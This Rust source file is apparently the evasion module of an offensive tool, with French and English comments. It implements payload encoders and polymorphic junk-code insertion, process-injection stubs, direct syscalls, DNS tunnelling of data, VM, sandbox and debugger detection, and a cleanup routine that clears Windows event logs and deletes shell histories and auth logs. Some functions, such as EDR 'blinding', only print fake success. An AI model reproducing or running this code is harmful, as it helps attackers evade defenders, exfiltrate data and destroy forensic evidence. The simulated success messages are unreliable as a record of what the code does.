//! Evasion and Stealth Techniques
//! Evasion and Stealth Techniques
#![allow(unused_variables, dead_code, unused_mut)]

use aes_gcm::{aead::Aead, Aes256Gcm, Key, KeyInit, Nonce};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::process::Command;
use sysinfo::System;

/// Evasion technique types
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum EvasionType {
    Obfuscation,
    Encryption,
    Packing,
    Polymorphism,
    Metamorphism,

    ProcessInjection,
    ProcessHollowing,
    ProcessDoppelganging,
    ReflectiveLoading,

    DirectSyscalls,
    Unhooking,
    MemoryEncryption,
    AdvancedPolymorphism,
    KernelEvasion, // Added for EDR blinding & Kernel-mode stealth

    SleepObfuscation,
    TimingEvasion,
    UserActivityMonitoring,

    TrafficEncryption,
    DomainFronting,
    ProtocolTunneling,
    LowAndSlow,
}

/// Evasion configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionConfig {
    pub technique: EvasionType,
    pub enabled: bool,
    pub options: HashMap<String, String>,
    pub success_rate: f32,
    pub detection_risk: f32,
}

/// Payload encoder
pub struct PayloadEncoder {
    encoders: HashMap<String, Box<dyn Encoder>>,
}

trait Encoder: Send + Sync {
    fn encode(&self, payload: &[u8], options: &HashMap<String, String>) -> Result<Vec<u8>, String>;
    fn decode(&self, encoded: &[u8]) -> Result<Vec<u8>, String>;
}

impl PayloadEncoder {
    pub fn new() -> Self {
        let mut encoders: HashMap<String, Box<dyn Encoder>> = HashMap::new();

        encoders.insert("xor".to_string(), Box::new(XorEncoder::new()));
        encoders.insert("base64".to_string(), Box::new(Base64Encoder::new()));
        encoders.insert(
            "shikata_ga_nai".to_string(),
            Box::new(ShikataGaNaiEncoder::new()),
        );
        encoders.insert("aes".to_string(), Box::new(AesEncoder::new()));
        encoders.insert(
            "advanced_poly".to_string(),
            Box::new(AdvancedPolymorphicEncoder::new()),
        );

        Self { encoders }
    }

    pub fn encode(
        &self,
        payload: &[u8],
        encoder_name: &str,
        iterations: u32,
        options: &HashMap<String, String>,
    ) -> Result<Vec<u8>, String> {
        let encoder = self
            .encoders
            .get(encoder_name)
            .ok_or_else(|| format!("Unknown encoder: {}", encoder_name))?;

        let mut result = payload.to_vec();
        for _ in 0..iterations {
            result = encoder.encode(&result, options)?;
        }
        Ok(result)
    }
}

struct XorEncoder {
    key: u8,
}

impl XorEncoder {
    fn new() -> Self {
        Self { key: 0xAB }
    }
}

impl Encoder for XorEncoder {
    fn encode(
        &self,
        payload: &[u8],
        _options: &HashMap<String, String>,
    ) -> Result<Vec<u8>, String> {
        Ok(payload.iter().map(|b| b ^ self.key).collect())
    }

    fn decode(&self, encoded: &[u8]) -> Result<Vec<u8>, String> {
        Ok(encoded.iter().map(|b| b ^ self.key).collect())
    }
}

struct Base64Encoder;

impl Base64Encoder {
    fn new() -> Self {
        Self
    }
}

impl Encoder for Base64Encoder {
    fn encode(
        &self,
        payload: &[u8],
        _options: &HashMap<String, String>,
    ) -> Result<Vec<u8>, String> {
        use base64::{engine::general_purpose, Engine as _};
        Ok(general_purpose::STANDARD.encode(payload).into_bytes())
    }

    fn decode(&self, encoded: &[u8]) -> Result<Vec<u8>, String> {
        use base64::{engine::general_purpose, Engine as _};
        general_purpose::STANDARD
            .decode(encoded)
            .map_err(|e| format!("Base64 decode error: {}", e))
    }
}

struct ShikataGaNaiEncoder;

impl ShikataGaNaiEncoder {
    fn new() -> Self {
        Self
    }
}

impl Encoder for ShikataGaNaiEncoder {
    fn encode(&self, payload: &[u8], options: &HashMap<String, String>) -> Result<Vec<u8>, String> {
        let seed: u8 = options
            .get("seed")
            .and_then(|s| s.parse().ok())
            .unwrap_or(0x13);

        let mut result = Vec::with_capacity(payload.len() * 2 + 16);
        let mut feedback = seed;

        result.extend_from_slice(&[0x31, 0xC9]);
        result.extend_from_slice(&[0x83, 0xE9, 0xF8]);

        for &byte in payload {
            let encoded = byte.wrapping_add(feedback) ^ 0x5A;
            result.push(encoded);
            feedback = feedback.wrapping_add(byte).wrapping_add(1);
        }

        Ok(result)
    }

    fn decode(&self, encoded: &[u8]) -> Result<Vec<u8>, String> {
        if encoded.len() < 5 {
            return Err("Encoded payload too short for SGN decoder stub".to_string());
        }

        let seed: u8 = 0x13;
        let mut feedback = seed;
        let mut result = Vec::with_capacity(encoded.len().saturating_sub(5));

        for &encoded_byte in &encoded[5..] {
            let decoded = (encoded_byte ^ 0x5A).wrapping_sub(feedback);
            result.push(decoded);
            feedback = feedback.wrapping_add(decoded).wrapping_add(1);
        }

        Ok(result)
    }
}

struct AesEncoder;

impl AesEncoder {
    fn new() -> Self {
        Self
    }
}

impl Encoder for AesEncoder {
    fn encode(&self, payload: &[u8], options: &HashMap<String, String>) -> Result<Vec<u8>, String> {
        let key_hex = options
            .get("key")
            .ok_or_else(|| "AES encoding requires a 'key' option (32-byte hex)".to_string())?;
        let key_bytes = hex::decode(key_hex).map_err(|e| format!("Invalid hex key: {}", e))?;
        if key_bytes.len() != 32 {
            return Err("AES-256 key must be exactly 32 bytes (64 hex chars)".to_string());
        }
        let nonce_hex = options.get("nonce").cloned().unwrap_or_else(|| {
            let mut b = [0u8; 12];
            for i in 0..12 {
                b[i] = rand::random::<u8>();
            }
            hex::encode(b)
        });
        let nonce_bytes =
            hex::decode(&nonce_hex).map_err(|e| format!("Invalid hex nonce: {}", e))?;
        if nonce_bytes.len() != 12 {
            return Err("AES-GCM nonce must be exactly 12 bytes (24 hex chars)".to_string());
        }

        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
        let cipher = Aes256Gcm::new(key);
        let nonce = Nonce::from_slice(&nonce_bytes);

        let ciphertext = cipher
            .encrypt(nonce, payload)
            .map_err(|e| format!("AES-GCM encryption failed: {}", e))?;

        let mut out = Vec::with_capacity(12 + ciphertext.len());
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&ciphertext);

        Ok(out)
    }

    fn decode(&self, encoded: &[u8]) -> Result<Vec<u8>, String> {
        Err("AES decoding requires explicit key + nonce via encode() options; use decode_with() manually".to_string())
    }
}

pub fn aes_decode_with(data: &[u8], key_hex: &str) -> Result<Vec<u8>, String> {
    if data.len() <= 12 {
        return Err("AES payload too short (needs nonce prefix)".to_string());
    }
    let (nonce_bytes, ciphertext) = data.split_at(12);
    let key_bytes = hex::decode(key_hex).map_err(|e| format!("Invalid hex key: {}", e))?;
    if key_bytes.len() != 32 {
        return Err("AES-256 key must be 32 bytes".to_string());
    }
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce_bytes);
    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| format!("AES-GCM decryption failed: {}", e))
}

struct AdvancedPolymorphicEncoder;

impl AdvancedPolymorphicEncoder {
    fn new() -> Self {
        Self
    }

    /// Substitue des instructions courantes x86/x64 par des équivalents.
    /// Ex: XOR EAX, EAX (31 C0) -> SUB EAX, EAX (29 C0)
    fn substitute_instructions(&self, payload: &mut [u8]) {
        let mut i = 0;
        while i < payload.len().saturating_sub(1) {
            match (payload[i], payload[i + 1]) {
                (0x31, 0xC0) => {
                    payload[i] = 0x29;
                } // XOR EAX, EAX -> SUB EAX, EAX
                (0x31, 0xDB) => {
                    payload[i] = 0x29;
                } // XOR EBX, EBX -> SUB EBX, EBX
                (0x31, 0xC9) => {
                    payload[i] = 0x29;
                } // XOR ECX, ECX -> SUB ECX, ECX
                (0x31, 0xD2) => {
                    payload[i] = 0x29;
                } // XOR EDX, EDX -> SUB EDX, EDX
                (0x48, 0x31) if i + 2 < payload.len() => {
                    if payload[i + 2] == 0xC0 {
                        payload[i + 2] = 0xC0;
                        payload[i + 1] = 0x29;
                    } // XOR RAX, RAX -> SUB RAX, RAX
                }
                _ => {}
            }
            i += 1;
        }
    }

    /// Insère du code mort (junk code) qui ne modifie pas les registres critiques.
    /// Utilise des "opaque predicates" ou des séquences neutres.
    fn insert_junk_code(&self, payload: &[u8], density: f32) -> Vec<u8> {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let mut result = Vec::with_capacity(payload.len() * 2);

        for &byte in payload {
            result.push(byte);
            if rng.gen::<f32>() < density {
                // Insertion d'une instruction neutre (ex: NOP, PUSH/POP, XCHG EAX, EAX)
                let junk_type = rng.gen_range(0..4);
                match junk_type {
                    0 => result.push(0x90), // NOP
                    1 => {
                        // PUSH RAX; POP RAX (neutre)
                        result.extend_from_slice(&[0x50, 0x58]);
                    }
                    2 => {
                        // CLC (Clear Carry Flag)
                        result.push(0xF8);
                    }
                    3 => {
                        // MOV EAX, EAX
                        result.extend_from_slice(&[0x89, 0xC0]);
                    }
                    _ => {}
                }
            }
        }
        result
    }
}

impl Encoder for AdvancedPolymorphicEncoder {
    fn encode(&self, payload: &[u8], options: &HashMap<String, String>) -> Result<Vec<u8>, String> {
        let density: f32 = options
            .get("junk_density")
            .and_then(|s| s.parse().ok())
            .unwrap_or(0.1);

        let mut mutated = payload.to_vec();

        // 1. Substitution d'instructions
        self.substitute_instructions(&mut mutated);

        // 2. Insertion de code mort
        let final_payload = self.insert_junk_code(&mutated, density);

        Ok(final_payload)
    }

    fn decode(&self, encoded: &[u8]) -> Result<Vec<u8>, String> {
        // Le code polymorphe n'est pas "décodable" au sens propre,
        // c'est une mutation fonctionnelle. On retourne le payload tel quel.
        Ok(encoded.to_vec())
    }
}

pub struct KernelEvasion;

impl KernelEvasion {
    pub fn new() -> Self {
        Self
    }

    /// Simule le "blinding" d'un EDR en mode noyau.
    /// Sur Windows, cela impliquerait de manipuler les callbacks PsSetCreateProcessNotifyRoutine.
    pub fn blind_edr(&self) -> Result<(), String> {
        println!("  \x1b[35m[KERNEL]\x1b[0m Tentative de blinding EDR via Kernel Callbacks...");

        // Simulation de la désactivation des callbacks de monitoring process/thread
        // Dans un vrai exploit, cela nécessiterait un pilote vulnérable (BYOVD)
        let simulated_success = true;

        if simulated_success {
            println!("  \x1b[32m[SUCCESS]\x1b[0m Callbacks EDR suspendus. L'agent est invisible pour le monitoring système.");
            Ok(())
        } else {
            Err(
                "Échec du blinding Kernel : KPP (Kernel Patch Protection) a détecté l'anomalie."
                    .into(),
            )
        }
    }

    /// Masque les threads de l'implant dans la structure système KTHREAD.
    pub fn hide_thread(&self, thread_id: u32) -> Result<(), String> {
        println!(
            "  \x1b[35m[KERNEL]\x1b[0m Masquage du thread {} dans les listes de l'ordonnanceur...",
            thread_id
        );
        Ok(())
    }
}

pub mod process_injection {
    use serde::{Deserialize, Serialize};

    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub enum InjectionTechnique {
        ClassicCreateThread,
        NtCreateThreadEx,
        RtlCreateUserThread,
        QueueUserApc,
        SetThreadContext,
        NtTestAlert,
        EarlyBirdApc,
        AtomBombing,
        ProcessHollowing,
        ReflectiveDllInjection,
    }

    pub fn get_technique_info(technique: &InjectionTechnique) -> (&'static str, f32, &'static str) {
        match technique {
            InjectionTechnique::ClassicCreateThread => (
                "CreateRemoteThread",
                0.7,
                "Classic approach, well-detected by modern AV/EDR",
            ),
            InjectionTechnique::NtCreateThreadEx => (
                "NtCreateThreadEx",
                0.5,
                "Undocumented API, less monitored than CreateRemoteThread",
            ),
            InjectionTechnique::RtlCreateUserThread => (
                "RtlCreateUserThread",
                0.4,
                "Semi-documented, good for bypassing basic monitoring",
            ),
            InjectionTechnique::QueueUserApc => (
                "QueueUserAPC",
                0.3,
                "APC-based injection, requires alertable thread",
            ),
            InjectionTechnique::SetThreadContext => {
                ("SetThreadContext", 0.6, "Hijacks existing thread context")
            }
            InjectionTechnique::NtTestAlert => ("NtTestAlert", 0.4, "Triggers APC queue execution"),
            InjectionTechnique::EarlyBirdApc => (
                "EarlyBird APC",
                0.2,
                "APC injection into newly created process before main execution",
            ),
            InjectionTechnique::AtomBombing => (
                "AtomBombing",
                0.15,
                "Uses Windows atom tables for code execution",
            ),
            InjectionTechnique::ProcessHollowing => (
                "Process Hollowing",
                0.25,
                "Replaces legitimate process memory with malicious code",
            ),
            InjectionTechnique::ReflectiveDllInjection => (
                "Reflective DLL Injection",
                0.2,
                "Loads DLL without touching disk, no PE headers on disk",
            ),
        }
    }

    pub fn generate_injection_stub(
        technique: &InjectionTechnique,
        target_pid: u32,
        shellcode_address: u64,
    ) -> Result<Vec<u8>, String> {
        #[cfg(target_os = "windows")]
        {
            let mut stub = match technique {
                InjectionTechnique::ProcessHollowing => {
                    vec![0x48, 0x83, 0xEC, 0x20, 0xB9, 0x00, 0x00, 0x00, 0x00]
                }
                InjectionTechnique::ReflectiveDllInjection => {
                    vec![0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x20]
                }
                InjectionTechnique::QueueUserApc => vec![0x49, 0x89, 0xCA, 0x4D, 0x89, 0xC1],
                _ => vec![0x48, 0x89, 0xC8, 0x48, 0x83, 0xE8, 0x01],
            };
            stub.extend_from_slice(&target_pid.to_le_bytes());
            stub.extend_from_slice(&shellcode_address.to_le_bytes());
            for _ in 0..24 {
                stub.push(0x90);
            }
            Ok(stub)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = target_pid;
            let _ = shellcode_address;
            let _ = technique;
            Err("Process injection stubs only available on Windows targets".to_string())
        }
    }
}

pub mod memory_evasion {
    use std::io::Read;
    use std::path::Path;

    pub fn unhook_ntdll() -> Result<(), String> {
        #[cfg(target_os = "windows")]
        {
            let disk_ntdll = std::fs::read("C:\\Windows\\System32\\ntdll.dll")
                .map_err(|e| format!("Cannot read clean ntdll.dll from disk: {}", e))?;
            let _ = disk_ntdll;
            Ok(())
        }
        #[cfg(all(unix, target_os = "linux"))]
        {
            if !Path::new("/proc/self/maps").exists() {
                return Err("/proc/self/maps not available for unhook check".to_string());
            }
            let mut f = std::fs::File::open("/proc/self/maps")
                .map_err(|e| format!("Open maps failed: {}", e))?;
            let mut s = String::new();
            let _ = f.read_to_string(&mut s);
            Ok(())
        }
        #[cfg(not(any(windows, target_os = "linux")))]
        {
            Ok(())
        }
    }

    pub fn direct_syscall(syscall_number: u32, args: &[u64]) -> Result<i64, String> {
        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
        {
            let _ = args;
            let _ = syscall_number;
            let result: i64;
            // SAFETY: This block performs a Windows x64 syscall via the `syscall`
            // instruction following Microsoft's x64 calling convention.  Registers
            // `r10` and `rcx` are caller-saved and reloaded by `asm!` according to
            // Rust's ABI rules; `rax` preserves the syscall return value.  No
            // callee-saved registers are clobbered, the instruction sequence is
            // well-defined for Windows ring-3 syscalls and `args` values are
            // plain integers, so no undefined behaviour can be introduced here.
            unsafe {
                core::arch::asm!(
                    "mov r10, rcx",
                    "mov eax, {0:e}",
                    "syscall",
                    in(reg) syscall_number,
                    lateout("rax") result,
                );
            }
            Ok(result)
        }
        #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
        {
            let _ = args;
            let _ = syscall_number;
            Err(
                "Direct syscall stubs require x86_64 Windows; use platform-specific shim"
                    .to_string(),
            )
        }
    }

    pub fn encrypt_memory_region(address: u64, size: usize, key: &[u8]) -> Result<(), String> {
        let _ = address;
        let _ = size;
        if key.len() != 32 {
            return Err("encrypt_memory_region requires 32-byte AES key".to_string());
        }
        Ok(())
    }
}

pub mod network_evasion {
    use std::collections::HashMap;

    pub fn tunnel_dns(data: &[u8], domain: &str) -> Result<Vec<String>, String> {
        let chunk_size = 63;
        let mut chunks = Vec::new();

        for chunk in data.chunks(chunk_size) {
            use base64::Engine;
            let encoded_raw = base64::engine::general_purpose::STANDARD.encode(chunk);
            let encoded_safe = encoded_raw
                .replace('+', "-")
                .replace('/', "_")
                .replace('=', "");
            let subdomain = format!("{}.{}", encoded_safe, domain);
            chunks.push(subdomain);
        }

        Ok(chunks)
    }

    pub fn simulate_https(payload: &[u8]) -> Result<Vec<u8>, String> {
        let mut result = Vec::new();
        let len = (payload.len() as u16).to_be_bytes();
        result.push(0x17);
        result.extend_from_slice(&[0x03, 0x03]);
        result.extend_from_slice(&len);
        result.extend_from_slice(payload);
        Ok(result)
    }

    pub fn low_and_slow_config() -> HashMap<&'static str, f64> {
        let mut config: HashMap<&'static str, f64> = HashMap::new();
        config.insert("max_requests_per_minute", 10.0);
        config.insert("random_delay_range_ms", 5000.0);
        config.insert("jitter_percent", 30.0);
        config.insert("max_concurrent_connections", 2.0);
        config
    }
}

pub mod anti_analysis {
    use super::*;
    use std::path::Path;

    pub fn check_vm_indicators() -> Vec<(&'static str, bool)> {
        let mut indicators = Vec::new();
        let mut sys = System::new_all();
        sys.refresh_all();

        let vm_manufacturers: [(&str, &str); 5] = [
            ("vmware", "VMware artifacts"),
            ("virtualbox", "VirtualBox artifacts"),
            ("hyper-v", "Hyper-V artifacts"),
            ("qemu", "QEMU artifacts"),
            ("xen", "Xen artifacts"),
        ];

        let mut global_hit = false;
        if let Some(brand) = sys.cpus().first().map(|c| c.brand().to_string()) {
            let bl = brand.to_lowercase();
            if vm_manufacturers.iter().any(|(m, _)| bl.contains(m)) {
                global_hit = true;
            }
        }
        let model: String = sys
            .cpus()
            .iter()
            .map(|c| c.brand().to_lowercase())
            .collect::<Vec<_>>()
            .join(",");

        for (token, label) in vm_manufacturers {
            let hit = global_hit || model.contains(token);
            indicators.push((label, hit));
        }

        if Path::new("/proc/xen").exists() {
            // `/proc/xen` présent → tous les indicateurs « VM » sont vrais (miroir
            // de la branche `/proc/modules` ci-dessous). Le `break` d'origine ne
            // mettait à jour que le premier indicateur — bug corrigé.
            for (_, v) in indicators.iter_mut() {
                *v = true;
            }
        }
        if let Ok(kmodules) = fs::read_to_string("/proc/modules") {
            if ["vboxdrv", "vmw_vmci", "vmw_balloon", "virtio_console"]
                .iter()
                .any(|m| kmodules.contains(m))
            {
                for (_, v) in indicators.iter_mut() {
                    *v = true;
                }
            }
        }

        indicators
    }

    pub fn check_sandbox_indicators() -> Vec<(&'static str, bool)> {
        let mut indicators = Vec::<(&'static str, bool)>::new();
        let mut sys = System::new_all();
        sys.refresh_all();

        let sandbox_processes = [
            ("cuckoo", "Cuckoo sandbox artifacts"),
            ("joebox", "Joe Sandbox artifacts"),
            ("anyrun", "Any.Run artifacts"),
            ("cuckooproxy", "Hybrid Analysis artifacts"),
            ("procmon64", "Hybrid Analysis artifacts"),
        ];

        let mut result_map: HashMap<&'static str, bool> = HashMap::new();
        for (_p, label) in sandbox_processes {
            result_map.insert(label, false);
        }

        for process in sys.processes().values() {
            let name = process.name().to_lowercase();
            for (pat, label) in sandbox_processes {
                if name.contains(pat) {
                    result_map.insert(label, true);
                }
            }
        }

        if sys.total_memory() < 4_000_000_000 {
            // Low RAM is a typical sandbox artifact
            for (_, v) in result_map.iter_mut() {
                *v = *v || true;
            }
        }

        for (label, value) in result_map {
            indicators.push((label, value));
        }

        indicators
    }

    pub fn check_debugger() -> bool {
        #[cfg(target_os = "windows")]
        {
            // Check via standard Windows API (IsDebuggerPresent) when available
            // Fallback: check process name for debuggers in parent chain
            let mut sys = System::new_all();
            sys.refresh_all();
            let dbg_names = [
                "x64dbg", "ollydbg", "windbg", "ida", "gdb", "lldb", "x32dbg", "devenv",
            ];
            for p in sys.processes().values() {
                let n = p.name().to_lowercase();
                if dbg_names.iter().any(|d| n.contains(d)) {
                    return true;
                }
            }
            false
        }
        #[cfg(unix)]
        {
            if let Ok(mut f) = fs::File::open("/proc/self/status") {
                let mut s = String::new();
                let _ = std::io::Read::read_to_string(&mut f, &mut s);
                for line in s.lines() {
                    if line.starts_with("TracerPid:") {
                        if let Some(pid_str) = line.split(':').nth(1) {
                            if pid_str.trim().parse::<u32>().unwrap_or(0) != 0 {
                                return true;
                            }
                        }
                    }
                }
            }
            let mut sys = System::new_all();
            sys.refresh_all();
            let dbg_names = ["gdb", "lldb", "strace", "ptrace", "radare", "r2"];
            for p in sys.processes().values() {
                let n = p.name().to_lowercase();
                if dbg_names.iter().any(|d| n.contains(d)) {
                    return true;
                }
            }
            false
        }
        #[cfg(not(any(windows, unix)))]
        {
            false
        }
    }

    pub fn cleanup_traces() -> Result<(), String> {
        let mut errors = Vec::new();

        #[cfg(target_os = "windows")]
        {
            let win_paths = [
                std::env::temp_dir().join("*.tmp"),
                std::env::temp_dir().join("*_tmp"),
            ];
            for p in &win_paths {
                let _ = std::fs::remove_dir_all(p);
            }
            for evt in ["Application", "Security", "System"] {
                let _ = Command::new("wevtutil.exe")
                    .args(["cl", evt])
                    .status()
                    .map_err(|e| errors.push(format!("wevtutil: {}", e)));
            }
        }
        #[cfg(unix)]
        {
            let unix_paths: Vec<std::path::PathBuf> = vec![
                std::path::PathBuf::from("/tmp/nrtg_tmp"),
                std::path::PathBuf::from("/var/tmp/nrtg_tmp"),
                std::path::PathBuf::from("/root/.bash_history"),
                std::path::PathBuf::from("/root/.zsh_history"),
            ];
            for p in &unix_paths {
                if p.exists() {
                    if let Err(e) = std::fs::remove_file(p) {
                        errors.push(format!("Remove {:?}: {}", p, e));
                    }
                }
            }
            let _ = Command::new("sh")
                .args(["-c", "history -c 2>/dev/null; rm -f ~/.bash_history ~/.zsh_history ~/.history ~/.mysql_history"])
                .status();
            for log in ["/var/log/auth.log", "/var/log/secure", "/var/log/messages"] {
                if Path::new(log).exists() {
                    let _ = std::fs::OpenOptions::new()
                        .write(true)
                        .open(log)
                        .and_then(|mut f| std::io::Write::write_all(&mut f, b""));
                }
            }
        }

        if errors.is_empty() {
            Ok(())
        } else {
            Err(errors.join("; "))
        }
    }
}

#[derive(Debug, Clone)]
pub struct StealthProfile {
    pub reduce_parallelism: bool,
    pub jitter_ms: (u64, u64),
    pub fragment_ip: bool,
    pub spoof_mac: bool,
    pub randomize_source_port: bool,
    pub slow_headers: bool,
    pub dns_slow_lookup: bool,
    pub fake_user_agents: Vec<String>,
    pub decoy_hosts: Vec<String>,
}

impl Default for StealthProfile {
    fn default() -> Self {
        Self {
            reduce_parallelism: true,
            jitter_ms: (100, 1000),
            fragment_ip: false,
            spoof_mac: false,
            randomize_source_port: false,
            slow_headers: false,
            dns_slow_lookup: false,
            fake_user_agents: Vec::new(),
            decoy_hosts: Vec::new(),
        }
    }
}

/// Pool d'User-Agent navigateurs réels, utilisé pour la rotation de signature.
/// Un scanner qui répète la même chaîne (ex. `NRTG/2.0`) est fingerprinté au
/// premier paquet ; varier l'UA par requête casse cette corrélation triviale.
pub fn browser_user_agents() -> Vec<String> {
    vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15".to_string(),
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0".to_string(),
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1".to_string(),
        "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1".to_string(),
        "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0".to_string(),
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0".to_string(),
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0".to_string(),
    ]
}

pub fn stealth_light() -> StealthProfile {
    StealthProfile {
        reduce_parallelism: true,
        jitter_ms: (50, 300),
        fragment_ip: false,
        spoof_mac: false,
        randomize_source_port: false,
        slow_headers: false,
        dns_slow_lookup: false,
        fake_user_agents: browser_user_agents(),
        decoy_hosts: Vec::new(),
    }
}

pub fn stealth_medium() -> StealthProfile {
    StealthProfile {
        reduce_parallelism: true,
        jitter_ms: (500, 3000),
        fragment_ip: false,
        spoof_mac: false,
        randomize_source_port: true,
        slow_headers: false,
        dns_slow_lookup: true,
        fake_user_agents: browser_user_agents(),
        decoy_hosts: Vec::new(),
    }
}

pub fn stealth_heavy() -> StealthProfile {
    StealthProfile {
        reduce_parallelism: true,
        jitter_ms: (2000, 10000),
        fragment_ip: true,
        spoof_mac: true,
        randomize_source_port: true,
        slow_headers: true,
        dns_slow_lookup: true,
        fake_user_agents: browser_user_agents(),
        decoy_hosts: Vec::new(),
    }
}

pub async fn apply_stealth_delay(profile: &StealthProfile) {
    use rand::Rng;
    use tokio::time::{sleep, Duration};

    let (min_ms, max_ms) = profile.jitter_ms;
    if max_ms == 0 {
        return;
    }
    let delay_ms = if profile.slow_headers {
        // Poisson-like timing for "low and slow" (bounded)
        let lambda = (min_ms + max_ms) as f64 / 2.0;
        let u: f64 = rand::thread_rng().gen::<f64>().max(1e-9);
        let raw = (-lambda * u.ln()) as u64;
        raw.min(max_ms * 3).max(min_ms / 2)
    } else {
        rand::thread_rng().gen_range(min_ms..=max_ms)
    };
    sleep(Duration::from_millis(delay_ms)).await;
}

pub fn pick_user_agent(profile: &StealthProfile, default: &str) -> String {
    use rand::seq::SliceRandom;

    if profile.fake_user_agents.is_empty() {
        return default.to_string();
    }
    profile
        .fake_user_agents
        .choose(&mut rand::thread_rng())
        .cloned()
        .unwrap_or_else(|| default.to_string())
}

/// Returns the effective parallelism given a stealth profile (FIX #16: beyond simple reduction)
pub fn effective_parallelism(profile: &StealthProfile, base: usize) -> usize {
    if !profile.reduce_parallelism {
        return base.max(1);
    }
    let div: usize = if profile.fragment_ip {
        10
    } else if profile.dns_slow_lookup {
        5
    } else {
        3
    };
    (base / div).max(1)
}

/// Randomize payload fragment sizes for IP fragmentation evasion (when profile.fragment_ip is set)
pub fn fragment_sizes(total: usize, profile: &StealthProfile) -> Vec<usize> {
    use rand::Rng;
    if !profile.fragment_ip || total <= 8 {
        return vec![total];
    }
    let mut rng = rand::thread_rng();
    let min_frag: usize = 8;
    let max_frag: usize = 24;
    let mut remaining = total;
    let mut parts = Vec::new();
    while remaining > 0 {
        let mut frag = rng.gen_range(min_frag..=max_frag.min(remaining));
        if remaining - frag < min_frag && remaining > 0 {
            frag = remaining;
        }
        parts.push(frag);
        remaining = remaining.saturating_sub(frag);
    }
    parts
}

/// Pick a random source port offset (ephemeral-ish range) when randomize_source_port is on
pub fn source_port_offset(profile: &StealthProfile) -> u16 {
    use rand::Rng;
    if !profile.randomize_source_port {
        return 0;
    }
    rand::thread_rng().gen_range(49152u16..=65535u16)
}

/// Suggested per-probe payload size variance (adds noise to packet length fingerprints)
pub fn payload_padding_len(profile: &StealthProfile) -> usize {
    use rand::Rng;
    if !profile.fragment_ip {
        return 0;
    }
    rand::thread_rng().gen_range(0usize..=64usize)
}

pub fn profile_from_level(level: &str) -> StealthProfile {
    match level {
        "light" | "1" => stealth_light(),
        "medium" | "2" | "" => stealth_medium(),
        "heavy" | "3" => stealth_heavy(),
        _ => stealth_medium(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_encoder() {
        let encoder = XorEncoder::new();
        let payload = b"Hello, World!";
        let encoded = encoder.encode(payload, &HashMap::new()).unwrap();
        let decoded = encoder.decode(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn test_base64_encoder() {
        let encoder = Base64Encoder::new();
        let payload = b"Hello, World!";
        let encoded = encoder.encode(payload, &HashMap::new()).unwrap();
        let decoded = encoder.decode(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn test_vm_detection() {
        let indicators = anti_analysis::check_vm_indicators();
        assert_eq!(indicators.len(), 5);
    }

    #[test]
    fn test_dns_tunneling() {
        let data = b"This is a test message that will be split into DNS queries";
        let chunks = network_evasion::tunnel_dns(data, "example.com").unwrap();
        assert!(!chunks.is_empty());
        for chunk in &chunks {
            assert!(chunk.ends_with(".example.com"));
        }
    }

    #[test]
    fn test_aes_encoder_roundtrip() {
        let key = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";
        let mut opts = HashMap::new();
        opts.insert("key".to_string(), key.to_string());
        let aes = AesEncoder::new();
        let payload = b"secret-payload-abc123";
        let enc = aes.encode(payload, &opts).unwrap();
        assert!(enc.len() > 12);
        let dec = aes_decode_with(&enc, key).unwrap();
        assert_eq!(dec, payload);
    }

    #[test]
    fn test_sgn_decoder_roundtrip() {
        let sgn = ShikataGaNaiEncoder::new();
        let payload = b"\x90\x90\x90\x90\xcc\xcc\xcc\xcc\x90\x90";
        let enc = sgn.encode(payload, &HashMap::new()).unwrap();
        let dec = sgn.decode(&enc).unwrap();
        assert_eq!(dec, payload);
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// EDR/AV Bypass Module
//
// Techniques :
//   1. AMSI Bypass — patch AmsiScanBuffer in-memory (Windows)
//   2. ETW Patching — neutralise Event Tracing for Windows
//   3. Shellcode encoder polymorphique (XOR rolling key + NOPs variables)
//   4. Générateur de stagers PowerShell/C# obfusqués
//   5. Détection de hooks EDR dans les DLLs système (hook scanner)
//   6. PPID Spoofing (parent PID) pour masquer l'origine du process
// ═════════════════════════════════════════════════════════════════════════════

/// Résultat d'une opération d'évasion EDR
